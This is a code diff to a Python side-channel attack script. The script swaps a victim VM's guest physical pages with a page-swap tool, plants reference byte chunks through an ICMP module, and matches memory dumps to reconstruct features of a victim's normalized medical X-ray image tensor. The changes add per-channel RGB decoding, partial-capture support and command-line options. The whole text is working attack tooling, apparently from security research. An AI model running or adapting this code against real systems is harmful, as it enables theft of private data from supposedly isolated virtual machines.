@@ -83,17 +83,42 @@ assert len(REF_U8_64) == 64
 _IMAGENET_MEAN_R = 0.485
 _IMAGENET_STD_R  = 0.229
 
+# Per-channel ImageNet normalize params (InterceptNormalize, same as R above).
+# The victim tensor is (3,224,224): a grayscale MURA pixel level u8 is identical
+# across R,G,B *before* normalize, but ToTensor()+Normalize stores DIFFERENT
+# float32 bytes per channel (different mean/std) -- so the same pixel has 3
+# distinct 16-byte chunk encodings in memory. End-to-end, a 2 MB write-tracked
+# block may capture a fraction of the image that lands in ANY plane (R, G, or
+# B), so the dictionary must be able to decode all three. The resulting XOR
+# match map is channel-AGNOSTIC (channel i = "pixel level == REF_U8_64[i]"),
+# identical whichever plane the bytes came from -> the SAME classifier consumes
+# it; no 3-channel fusion, only per-channel decode.
+_IMAGENET_MEAN = {"R": 0.485, "G": 0.456, "B": 0.406}
+_IMAGENET_STD  = {"R": 0.229, "G": 0.224, "B": 0.225}
+CHANNELS_ALL   = ("R", "G", "B")
 
-def normalize_u8_R(u8: int) -> np.float32:
-    """Exact float32 value a raw R-channel pixel level u8 (0-255) becomes
-    after ToTensor() (/255) + InterceptNormalize's R-channel mean/std."""
-    return (np.float32(u8) / np.float32(255) - np.float32(_IMAGENET_MEAN_R)) / np.float32(_IMAGENET_STD_R)
+
+def normalize_u8(u8: int, ch: str = "R") -> np.float32:
+    """Exact float32 value raw pixel level u8 (0-255) becomes after ToTensor()
+    (/255) + InterceptNormalize's per-channel mean/std, for channel ch."""
+    return ((np.float32(u8) / np.float32(255) - np.float32(_IMAGENET_MEAN[ch]))
+            / np.float32(_IMAGENET_STD[ch]))
 
 
-# REF_CHUNK_X: float32 normalized value as 4 bytes, repeated 4× → 16 bytes
-REF_CHUNKS: dict[int, bytes] = {
-    u8: (np.array([normalize_u8_R(u8)], dtype=np.float32)).view(np.uint8).tobytes() * 4
-    for u8 in REF_U8_64
+def normalize_u8_R(u8: int) -> np.float32:   # kept for backward compat
+    return normalize_u8(u8, "R")
+
+
+def _chunk16(u8: int, ch: str) -> bytes:
+    """float32 normalized value as 4 bytes, repeated 4x -> 16-byte chunk."""
+    return (np.array([normalize_u8(u8, ch)], dtype=np.float32)).view(np.uint8).tobytes() * 4
+
+
+# REF_CHUNK_X: R-channel 16-byte chunks (legacy name, R only).
+REF_CHUNKS: dict[int, bytes] = {u8: _chunk16(u8, "R") for u8 in REF_U8_64}
+# Per-channel 16-byte chunks: REF_CHUNKS_BY_CH[ch][u8].
+REF_CHUNKS_BY_CH: dict[str, dict[int, bytes]] = {
+    ch: {u8: _chunk16(u8, ch) for u8 in REF_U8_64} for ch in CHANNELS_ALL
 }
 
 # ── constants ─────────────────────────────────────────────────────────────────
@@ -580,10 +605,12 @@ def reload_icmp_module() -> None:
 
 
 # ── Phase 0: build ────────────────────────────────────────────────────────────
-def build(swap_tool: str) -> None:
+def build(swap_tool: str, channels: tuple[str, ...] = CHANNELS_ALL) -> None:
     DICT_DIR.mkdir(exist_ok=True)
+    channels = tuple(c for c in CHANNELS_ALL if c in channels) or ("R",)
 
-    print(f"[build] {len(REF_U8_64)} ref values: {REF_U8_64}")
+    print(f"[build] {len(REF_U8_64)} ref values x {len(channels)} channels "
+          f"{channels} = {len(REF_U8_64)*len(channels)} injections: {REF_U8_64}")
 
     print("[build] Reloading guest ICMP module to reset rate-limit state...")
     reload_icmp_module()
@@ -602,64 +629,111 @@ def build(swap_tool: str) -> None:
         fixed_gpa = int(cache["fixed_gpa"], 16)
         print(f"[build] FIXED_GPA = 0x{fixed_gpa:x}  (from cache)")
 
-    # Step 2: one send+swap_read per ref value
-    for i, u8_val in enumerate(REF_U8_64):
-        print(f"\n[{i+1:2d}/{len(REF_U8_64)}] u8={u8_val:3d}  "
-              f"chunk={REF_CHUNKS[u8_val].hex()}")
+    # Step 2: one send+swap_read per (ref value, channel).
+    # Each u8's cache entry gains per-channel dumps: {"R": {ref_gpa, file},
+    # "G": {...}, "B": {...}, "file": <R file, legacy>}. Resumes: a channel
+    # already present with an existing dump file is skipped.
+    jobs = [(u8, ch) for u8 in REF_U8_64 for ch in channels]
+    n = 0
+    for u8_val, ch in jobs:
+        n += 1
+        entry = cache["refs"].setdefault(str(u8_val), {})
+        prev = entry.get(ch)
+        if prev and Path(prev.get("file", "")).exists():
+            print(f"[{n:3d}/{len(jobs)}] u8={u8_val:3d} {ch}  (cached, skip)")
+            continue
 
-        if i > 0 and i % DRAIN_EVERY == 0:
+        chunk = REF_CHUNKS_BY_CH[ch][u8_val]
+        print(f"\n[{n:3d}/{len(jobs)}] u8={u8_val:3d} {ch}  chunk={chunk.hex()}")
+
+        if n > 1 and n % DRAIN_EVERY == 0:
             print("  [drain] flushing guest ICMP buffer + reloading module...")
             drain_rxbuf()
             reload_icmp_module()
 
-        out_path = DICT_DIR / f"ref_{u8_val:03d}.out"
+        out_path = DICT_DIR / f"ref_{u8_val:03d}_{ch}.out"
 
-        gpa_refX = acquire_gpa(u8_val)
-        print(f"  GPA_ref{u8_val:03d} = 0x{gpa_refX:x}")
+        gpa_refX = acquire_gpa(u8_val, chunk_bytes=chunk)
+        print(f"  GPA_ref{u8_val:03d}_{ch} = 0x{gpa_refX:x}")
 
         if gpa_refX == fixed_gpa:
             # Rare: kernel reused the same buffer page — retry once
             print(f"  [!] GPA_refX == FIXED_GPA, retry...")
             drain_rxbuf()
-            gpa_refX = acquire_gpa(u8_val)
+            gpa_refX = acquire_gpa(u8_val, chunk_bytes=chunk)
             if gpa_refX == fixed_gpa:
-                print(f"  [!] Still same GPA — skipping u8={u8_val}", file=sys.stderr)
+                print(f"  [!] Still same GPA — skipping u8={u8_val} {ch}", file=sys.stderr)
                 continue
 
         print(f"  do_swap_read(0x{fixed_gpa:x}, 0x{gpa_refX:x}) → {out_path.name}")
         do_swap_read(fixed_gpa, gpa_refX, out_path, swap_tool)
         time.sleep(6)  # let printk_ratelimited 5s window expire before next item
 
-        cache["refs"][str(u8_val)] = {
-            "ref_gpa":   hex(gpa_refX),
-            "fixed_gpa": hex(fixed_gpa),
-            "file":      str(out_path),
-        }
+        entry[ch] = {"ref_gpa": hex(gpa_refX), "fixed_gpa": hex(fixed_gpa),
+                     "file": str(out_path)}
+        if ch == "R":                      # legacy readers expect refs[u8]["file"]
+            entry.setdefault("file", str(out_path))
+            entry.setdefault("ref_gpa", hex(gpa_refX))
+            entry.setdefault("fixed_gpa", hex(fixed_gpa))
         with open(DICT_CACHE, "w") as f:
             json.dump(cache, f, indent=2)
 
-    n_done = len(cache["refs"])
-    print(f"\n[build] Done. {n_done}/{len(REF_U8_64)} refs → {DICT_CACHE}")
+    done = sum(1 for u8 in REF_U8_64
+               for ch in channels if cache["refs"].get(str(u8), {}).get(ch))
+    print(f"\n[build] Done. {done}/{len(jobs)} (ref,channel) dumps → {DICT_CACHE}")
 
 
 # ── Phase 1: infer ────────────────────────────────────────────────────────────
-def infer(image_gpa: int, swap_tool: str, out_path: Path) -> None:
+def _resolve_ref_path(stored: str) -> Path:
+    """Resolve a ref dump path from the cache. The stored path may be relative
+    to a different cwd (e.g. 'mura/dict_pages_mura/ref_000_R.out'); fall back to
+    DICT_DIR/<basename>."""
+    p = Path(stored)
+    if p.exists():
+        return p
+    return DICT_DIR / p.name
+
+
+def infer(image_gpa: int, swap_tool: str, out_path: Path,
+          pages: int = IMG_PAGES,
+          channels: tuple[str, ...] | None = None,
+          computed_fallback: bool = False) -> None:
+    """Reconstruct an XOR slice for the image content starting at image_gpa.
+
+    `pages` = number of contiguous 4 KB pages to dump (default 49 = full
+    image). For END-TO-END partial capture, a 2 MB write-tracked block may
+    hold only a FRACTION of the 49-page image; pass pages=<captured pages>
+    and image_gpa=<GPA of the first captured image page>. Content is written
+    TOP-ALIGNED into rows [0, ~pages/49*224) of the (64,224,56) slice — the
+    same convention train_64ref_v3_partial.py trains on (absolute row
+    position is unrecoverable, so both sides top-align). frac = pages/49 is
+    written to <out_path>.frac for the v3 classifier's scalar input.
+
+    `channels`: which planes to decode (None = every channel present in the
+    cache). The victim tensor is (3,224,224); a captured fraction may land in
+    the R, G or B plane, whose bytes differ (per-channel normalize). A chunk
+    counts as a hit for ref u8 if it matches that u8 in ANY requested channel,
+    so the output map is the same regardless of which plane produced the bytes.
+    """
     if not DICT_CACHE.exists():
         print(f"[!] {DICT_CACHE} not found — run --build first.", file=sys.stderr)
         sys.exit(1)
+    pages = max(1, min(IMG_PAGES, int(pages)))
 
     with open(DICT_CACHE) as f:
         cache = json.load(f)
 
     fixed_gpa = int(cache["fixed_gpa"], 16)
+    frac = pages / IMG_PAGES
     print(f"[infer] FIXED_GPA   = 0x{fixed_gpa:x}")
-    print(f"[infer] image_gpa   = 0x{image_gpa:x}  ({IMG_PAGES} pages)")
+    print(f"[infer] image_gpa   = 0x{image_gpa:x}  ({pages}/{IMG_PAGES} pages, "
+          f"frac={frac:.3f}, top-aligned)")
 
     IMG_TMP.mkdir(exist_ok=True)
 
-    # Dump 49 image pages at FIXED_GPA tweak
+    # Dump the captured image pages at FIXED_GPA tweak (top-aligned: k=0..pages-1)
     img_dumps: list[bytes] = []
-    for k in range(IMG_PAGES):
+    for k in range(pages):
         page_gpa = image_gpa + k * PAGE_SIZE
         tmp      = IMG_TMP / f"img_{k:02d}.out"
         if k > 0:
@@ -668,35 +742,77 @@ def infer(image_gpa: int, swap_tool: str, out_path: Path) -> None:
                 time.sleep(SWAP_BURST_SLEEP)
             elif SWAP_PACE_SEC > 0:
                 time.sleep(SWAP_PACE_SEC)
-        print(f"  page {k:2d}/48  do_swap_read(0x{fixed_gpa:x}, 0x{page_gpa:x}) → {tmp.name}")
+        print(f"  page {k:2d}/{pages-1}  do_swap_read(0x{fixed_gpa:x}, 0x{page_gpa:x}) → {tmp.name}")
         do_swap_read(fixed_gpa, page_gpa, tmp, swap_tool)
         img_dumps.append(parse_dump(tmp))
 
-    # Load 64 ref dumps
-    ref_dumps: dict[int, bytes] = {}
-    missing = []
+    # Resolve which channels to decode. The captured fraction may lie in ANY
+    # plane (R/G/B), so we accept a match against any requested channel's ref
+    # chunk. Auto = every channel with dumps in the cache (>=1 ref). Legacy
+    # caches have only refs[u8]["file"] (R) -> R only.
+    def _cache_channels() -> list[str]:
+        present = set()
+        for u8 in REF_U8_64:
+            e = cache["refs"].get(str(u8), {})
+            present.update(c for c in CHANNELS_ALL if e.get(c))
+            if "file" in e:
+                present.add("R")
+        return [c for c in CHANNELS_ALL if c in present]
+
+    use_channels = ([c for c in CHANNELS_ALL if c in channels] if channels
+                    else _cache_channels()) or ["R"]
+
+    # Per-u8 set of acceptable 16-byte chunks, pooled across channels. A ref
+    # page is a uniform repeat of one 16-byte pattern, so the per-offset dump
+    # chunks collapse to (ideally) a single pattern per channel; using a set
+    # merges dumped + computed patterns and makes matching channel-agnostic.
+    accept: dict[int, set] = {}
+    missing_ch: dict[str, int] = {c: 0 for c in CHANNELS_ALL}
     for u8_val in REF_U8_64:
-        entry = cache["refs"].get(str(u8_val))
-        if entry is None:
-            missing.append(u8_val)
-            continue
-        ref_dumps[u8_val] = parse_dump(Path(entry["file"]))
-    if missing:
-        print(f"[!] Missing ref dumps for u8 values: {missing}", file=sys.stderr)
-        print("[!] Re-run --build to complete the dictionary.", file=sys.stderr)
+        entry = cache["refs"].get(str(u8_val), {})
+        pats: set = set()
+        for ch in use_channels:
+            info = entry.get(ch)
+            path = None
+            if info and info.get("file"):
+                path = _resolve_ref_path(info["file"])
+            elif ch == "R" and entry.get("file"):        # legacy R
+                path = _resolve_ref_path(entry["file"])
+            if path and path.exists():
+                rb = parse_dump(path)
+                pats.update(rb[j*CHUNK_SIZE:(j+1)*CHUNK_SIZE] for j in range(CHUNKS_PAGE))
+            elif computed_fallback:
+                pats.add(REF_CHUNKS_BY_CH[ch][u8_val])   # exact float32 pattern
+            else:
+                missing_ch[ch] += 1
+        accept[u8_val] = pats
+
+    have = sum(1 for u8 in REF_U8_64 if accept[u8])
+    print(f"\n[infer] channels={use_channels}  computed_fallback={computed_fallback}")
+    print(f"[infer] {have}/{len(REF_U8_64)} refs have >=1 acceptable pattern")
+    for ch in use_channels:
+        if missing_ch[ch]:
+            print(f"[!] channel {ch}: {missing_ch[ch]} refs have no dump "
+                  f"(run --build --channels {''.join(use_channels)}, or use "
+                  f"--computed-gb to accept exact float32 patterns instead)",
+                  file=sys.stderr)
+    if not have:
+        print("[!] No ref patterns available — run --build first.", file=sys.stderr)
         sys.exit(1)
-    print(f"\n[infer] Loaded {len(ref_dumps)} ref dumps")
 
     # Build XOR slice (64, 224, 56)
-    # xor_slice[ref_idx, row, col] = 1.0 iff image chunk == ref chunk at that block
+    # xor_slice[ref_idx, row, col] = 1.0 iff image chunk matches ref u8 in ANY
+    # requested channel at that block.
     xor_slice = np.zeros((len(REF_U8_64), XOR_ROWS, XOR_COLS), dtype=np.float32)
 
     for ref_idx, u8_val in enumerate(REF_U8_64):
-        ref_bytes = ref_dumps[u8_val]
+        pats = accept[u8_val]
+        if not pats:
+            continue
         for k, img_bytes in enumerate(img_dumps):
             for j in range(CHUNKS_PAGE):          # 256 chunks per page
                 s = j * CHUNK_SIZE
-                if img_bytes[s:s+CHUNK_SIZE] == ref_bytes[s:s+CHUNK_SIZE]:
+                if img_bytes[s:s+CHUNK_SIZE] in pats:
                     flat = k * CHUNKS_PAGE + j     # 0 .. 12543
                     xor_slice[ref_idx, flat // XOR_COLS, flat % XOR_COLS] = 1.0
 
@@ -705,6 +821,9 @@ def infer(image_gpa: int, swap_tool: str, out_path: Path) -> None:
     print(f"\n[infer] XOR slice shape : {xor_slice.shape}")
     print(f"[infer] Total hits      : {total_hits} / {xor_slice.size}  "
           f"({total_hits/xor_slice.size*100:.2f}%)")
+    frac_path = out_path.with_suffix(out_path.suffix + ".frac")
+    frac_path.write_text(f"{frac:.6f}\n")
+    print(f"[infer] frac={frac:.3f} → {frac_path.name}  (pass to v3 classifier)")
     print(f"[infer] Saved → {out_path}")
 
 
@@ -761,19 +880,37 @@ def main() -> None:
     p.add_argument("--infer",     action="store_true",
                    help="Generate XOR slice for one image inference")
     p.add_argument("--image-gpa", type=lambda x: int(x, 0), default=None,
-                   help="Image tensor base GPA (hex, page-aligned, 49 pages)")
+                   help="Image tensor base GPA (hex, page-aligned). For a "
+                        "partial capture, GPA of the FIRST captured image page.")
+    p.add_argument("--pages", type=int, default=IMG_PAGES,
+                   help=f"# contiguous pages captured (default {IMG_PAGES}=full "
+                        f"R plane). For a 2 MB block holding only a fraction of "
+                        f"the image, pass the captured page count; slice is "
+                        f"top-aligned and frac=pages/{IMG_PAGES} is saved.")
+    p.add_argument("--channels", default=None,
+                   help="Channels to build/decode, e.g. 'RGB' or 'R'. "
+                        "build default: RGB (captured fraction may land in any "
+                        "plane). infer default: every channel present in cache.")
+    p.add_argument("--computed-gb", action="store_true",
+                   help="[infer] for channels with no dump in the cache, accept "
+                        "the exact float32 normalized pattern instead of a "
+                        "swap-read dump (skips rebuilding G/B; assumes the "
+                        "swap-read path is byte-lossless, as the R path does).")
     p.add_argument("--out",       default="xor_slice.npy",
                    help="Output .npy path (default: xor_slice.npy)")
     p.add_argument("--swap-tool", default=str(SWAP_TOOL),
                    help=f"Path to swap_pages_tool (default: {SWAP_TOOL})")
     args = p.parse_args()
 
+    chans = (tuple(c for c in args.channels.upper() if c in CHANNELS_ALL)
+             if args.channels else None)
     if args.build:
-        build(args.swap_tool)
+        build(args.swap_tool, channels=chans or CHANNELS_ALL)
     elif args.infer:
         if args.image_gpa is None:
             p.error("--infer requires --image-gpa 0x...")
-        infer(args.image_gpa, args.swap_tool, Path(args.out))
+        infer(args.image_gpa, args.swap_tool, Path(args.out), pages=args.pages,
+              channels=chans, computed_fallback=args.computed_gb)
     else:
         p.print_help()
 
